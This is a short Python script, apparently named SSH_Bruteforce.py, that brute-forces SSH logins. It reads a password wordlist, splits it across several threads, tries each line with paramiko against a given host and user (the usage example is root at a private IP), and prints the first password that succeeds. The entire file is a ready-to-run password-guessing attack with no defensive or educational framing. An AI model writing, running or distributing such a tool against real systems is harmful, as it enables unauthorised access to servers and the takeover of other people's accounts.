from threading import Thread
import argparse,sys,queue,linecache

import paramiko


class BruteForce:
    def __init__(self, host, user, filename,thread_num,q):
        self.host = host
        self.user = user
        self.filename = filename
        self.thread_num = thread_num
        self.q = q

    def run_thread(self):
        self.filelines = self.get_filelines(self.filename)
        self.one_lines = int(self.filelines/self.thread_num)
        self.remain_lines = self.filelines - self.one_lines*self.thread_num
        self.thread_list = []
        self.numberlines = 1
        for i in range(self.thread_num):
            if i == self.thread_num-1:
                lines = self.one_lines + self.remain_lines
            else:
                lines = self.one_lines
            thread = Thread(target=self.bruteforce, args=(self.numberlines,self.numberlines+lines,self.q),daemon=True)
            self.numberlines += lines
            self.thread_list.append(thread)
            thread.start()
        return self.thread_list

    def bruteforce(self,numberlines,lines,q):
        for i in range(numberlines,lines):
            line = linecache.getline(self.filename, i)
            line = line.strip()
            try:
                client = self.get_ssh().connect(self.host, username=self.user, password=line)
                q.put(line)   
                print(f'[+] {line} is correct')
                break
            except:
                print(f'[-] {line} is not correct')
                continue

    def get_ssh(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        return client

    def get_filelines(self,filename):
        return len(linecache.getlines(self.filename))

if __name__ == '__main__':
    help_text = '''exmple: python3 SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10'''
    parser = argparse.ArgumentParser(description=help_text)
    parser.add_argument('-H', '--host',type=str, help='Hostname/IP', required=True)
    parser.add_argument('-u', '--user', type=str,help='Username', required=True)
    parser.add_argument('-f', '--file', type=str,help='Password file', required=True)
    parser.add_argument('-t', '--thread', type=int,help='Thread number', required=True)
    args = parser.parse_args()
    host = args.host
    user = args.user
    filename = args.file
    thread_num = int(args.thread)
    q = queue.Queue()
    bf = BruteForce(host, user, filename, thread_num,q)
    thread_list = bf.run_thread()
    thread_join = 0
    while True:
        if not q.empty():
            sys.exit(f'SSH PassWord：{q.get()}')
        
        for i in thread_list:
            if not i.is_alive():
                thread_join += 1
                if thread_join == thread_num:
                    sys.exit('[!] Brute force finished\n[!] SSH password not found ')
        thread_join = 0
        